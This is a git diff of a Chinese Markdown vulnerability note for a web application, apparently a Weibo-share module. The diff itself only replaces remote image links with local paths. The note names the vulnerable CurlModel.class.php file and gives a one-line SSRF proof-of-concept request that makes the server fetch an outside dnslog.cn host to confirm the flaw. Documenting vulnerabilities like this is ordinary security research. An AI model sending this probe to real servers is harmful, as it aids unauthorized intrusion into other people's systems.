@@ -20,11 +20,11 @@ icon_hash="1167011145"
 
 登录页面如下
 
-![image-20220518154436896](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205181544965.png)
+![image-20220518154436896](./images/202205181544965.png)
 
 存在漏洞的文件为 `Application/Admin/Model/CurlModel.class.php`
 
-![image-20220518154502605](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205181545686.png)
+![image-20220518154502605](./images/202205181545686.png)
 
 构造POC
 
@@ -32,4 +32,4 @@ icon_hash="1167011145"
 /?s=weibo/share/shareBox&query=app=Admin%26model=Curl%26method=curl%26id=http://92aq2z.dnslog.cn
 ```
 
-![image-20220518154516760](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205181545840.png)
+![image-20220518154516760](./images/202205181545840.png)
